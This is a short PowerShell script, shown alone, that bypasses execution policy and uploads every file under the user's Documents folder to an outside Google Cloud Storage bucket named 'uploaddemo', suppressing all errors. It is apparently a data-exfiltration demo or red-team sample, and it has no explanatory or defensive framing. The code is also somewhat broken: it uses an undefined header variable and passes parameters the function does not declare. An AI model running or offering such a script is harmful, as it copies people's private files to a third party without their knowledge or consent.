powershell.exe -ExecutionPolicy Bypass -Command {
    Function UploadFile {Param ([string]$path) 
        Process 
        {$Uri = 'https://www.googleapis.com/upload/storage/v1/b/uploaddemo/o?uploadType=media&name='+$path;
        Invoke-RestMethod -Method Post -Uri $Uri -Header $header -ContentType 'text/plain' -InFile $path;
        }
    };

    Get-ChildItem -Path $HOME\Documents -Recurse |
        ForEach-Object { 
            try { 
            UploadFile -path $_.FullName -fileName $_.Name -dir $_.DirectoryName 
        }
        catch{} 
    }; 
}